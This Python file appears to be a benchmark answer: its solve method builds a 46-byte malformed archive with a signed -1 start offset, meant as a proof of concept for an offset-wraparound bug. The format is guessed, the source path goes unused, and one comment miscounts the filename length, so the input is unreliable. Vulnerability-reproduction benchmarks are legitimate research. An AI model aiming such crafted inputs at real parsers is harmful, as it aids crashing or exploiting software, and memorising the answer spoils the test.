import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This vulnerability is about negative archive start offset
        # We need to create input that causes offset calculation to wrap around
        
        # Based on common archive format patterns:
        # - Magic number at start
        # - Offset field that should be positive but can be manipulated
        
        # Create a minimal valid archive header then corrupt the offset
        
        # Structure:
        # 1. Magic bytes (4 bytes) - something like "AR\x00\x01"
        # 2. File count (4 bytes) - say 1
        # 3. Archive offset (4 bytes) - this is the vulnerable field, make it negative
        # 4. File entry (remaining bytes)
        
        # The key is to set offset to -1 (0xFFFFFFFF) which when used as unsigned
        # becomes large positive, but when used as signed becomes negative
        
        poc = bytearray()
        
        # Magic bytes - use a generic archive magic
        poc.extend(b'AR\x00\x01')  # 4 bytes
        
        # File count = 1
        poc.extend(struct.pack('<I', 1))  # 4 bytes, little-endian
        
        # Archive start offset = -1 (0xFFFFFFFF in two's complement)
        # This is the vulnerable field - negative offset
        poc.extend(struct.pack('<i', -1))  # 4 bytes, signed little-endian
        
        # Now add file entry to reach total 46 bytes
        # File entry structure (simplified):
        # - Filename (8 bytes)
        # - File size (4 bytes)
        # - File offset (4 bytes)
        # - Some dummy data
        
        # Filename
        poc.extend(b'test.txt\x00')  # 9 bytes with null terminator
        
        # File size = remaining bytes
        remaining = 46 - len(poc) - 8  # -8 for file size and offset fields
        poc.extend(struct.pack('<I', remaining))  # 4 bytes
        
        # File offset = 0
        poc.extend(struct.pack('<I', 0))  # 4 bytes
        
        # Add dummy data to reach exactly 46 bytes
        needed = 46 - len(poc)
        poc.extend(b'X' * needed)
        
        # Ensure exact length
        poc = poc[:46]
        
        return bytes(poc)